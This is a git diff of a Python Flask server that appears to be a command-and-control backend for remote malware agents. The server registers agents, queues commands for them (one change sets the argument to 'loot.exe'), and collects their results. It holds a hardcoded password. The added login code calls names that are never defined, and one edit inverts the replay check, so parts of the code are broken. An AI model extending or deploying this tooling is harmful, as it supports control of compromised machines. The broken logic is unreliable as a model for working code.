@@ -1,6 +1,7 @@
 from mimetypes import common_types
 from flask import Flask , request, jsonify, render_template
 from flask_sqlalchemy import SQLAlchemy
+from flask_login import LoginManager
 import os
 import jinja2
 
@@ -8,6 +9,7 @@ app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
 db = SQLAlchemy(app)
 
+login_manager = LoginManager()
 #job_cache = {}
 
 password = "Claws"
@@ -60,7 +62,7 @@ def create_task():
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":[""] , "status": TASKED,})
+    return jsonify({ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":"loot.exe" , "status": TASKED,})
 
 
 @app.route("/tasks/list", methods=["GET"])
@@ -84,13 +86,14 @@ def tasking():
 
     job_id = data.get("job_id")
     agent_id = data.get("agent_id")
-    task_result = data.get("task_response")
+    task_result = data.get("output")
+    task_command = data.get("command")
     if task_result:
         for response in task_result:
             t_job_id = response.get("job_id")
             t_job_resp = response.get("result")
             task = Task.query.filter_by(job_id = t_job_id).first()
-            if task.Status != TASKED:
+            if task.Status != DONE:
                 print("[+] Possible replay attack!", task)
             else:
                 print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
@@ -122,15 +125,12 @@ def tasking():
         return
     else:
         # have tasked the agent
-        task.Status = TASKED
+        task.Status = DONE
         db.session.commit()
-        t=[{
-            "status": task.Status,
-            "type": task.command_type,
-            "cmd": task.cmd,
-            "job_id": task.job_id,
-            "task_response": task_result
-        }]
+        t=[{ "job_id": task.job_id,
+             "agent_id":agent_id,
+             "command":task_command,
+             "status": DONE}]
         return render_template(
             'outPut.html',
             t=t
@@ -164,6 +164,28 @@ def register():# <-- handler
 
     db.session.commit()
     return jsonify({"status": "ok", "message": "Welcome!"})
+
+@login_manager.user_loader
+def load_user(agent_id):
+    return Agent.agent_id
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    form = LoginForm()
+    if form.validate_on_submit():
+        login_user(user)
+
+        flask.flash('Logged in successfully.')
+
+        next = flask.request.args.get('next')
+        # is_safe_url should check if the url is safe for redirects.
+        # See http://flask.pocoo.org/snippets/62/ for an example.
+        if not is_safe_url(next):
+            return flask.abort(400)
+
+        return flask.redirect(next or flask.url_for('index'))
+    return flask.render_template('login.html', form=form)
+
 
 if __name__ == "__main__":
     app.run()
